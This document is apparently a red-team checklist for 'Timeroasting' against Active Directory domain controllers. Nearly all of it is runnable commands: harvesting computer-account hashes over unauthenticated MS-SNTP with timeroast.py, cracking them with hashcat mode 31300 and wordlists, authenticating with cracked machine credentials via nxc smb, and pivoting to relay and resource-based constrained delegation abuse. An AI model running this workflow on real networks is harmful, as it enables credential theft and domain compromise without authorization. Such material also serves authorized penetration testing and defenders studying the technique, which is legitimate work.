# Timeroasting

## Before I start
- [ ] UDP 123 open on the DC (it's the domain time source — usually yes)
- [ ] No credentials needed — MS-SNTP answers unauthenticated RID queries

## Harvest
python3 timeroast.py <DCIP> | tee timeroast.hashes
python3 timeroast.py <DCIP> --rate 24 | tee -a timeroast.hashes
- [ ] Each line is an MD4-signed NTP response for one computer RID = crackable computer-account hash
- [ ] RIDs walk the whole domain — computer accounts only, not users

## Crack
hashcat -m 31300 timeroast.hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 31300 timeroast.hashes --show
- [ ] Default computer passwords are 120-char random — they will NOT crack
- [ ] What cracks: manually-set machine passwords, cloned images with stale pwds, accounts with password-never-changes

## Use a cracked machine account
nxc smb <Targets> -u 'HOST$' -p '<CrackedPass>' -d <Domain>
- [ ] Machine creds = domain auth: enum, BloodHound, and relay material: :Pb ntlm-relay
- [ ] Old/stale machine accounts sometimes retain juicy ACLs — check BloodHound

## If it fails
- [ ] No hashes returned → UDP 123 filtered or the DC isn't a time server; try the PDC emulator specifically
- [ ] Everything uncracked → expected on healthy domains; keep the file, retry with better rules/targeted lists

## Next
- [ ] Any machine cred → RBCD-style plays via machine-account abuse: :Pb machine-account-abuse
- [ ] Hashes that won't crack stay as future mask-attack candidates
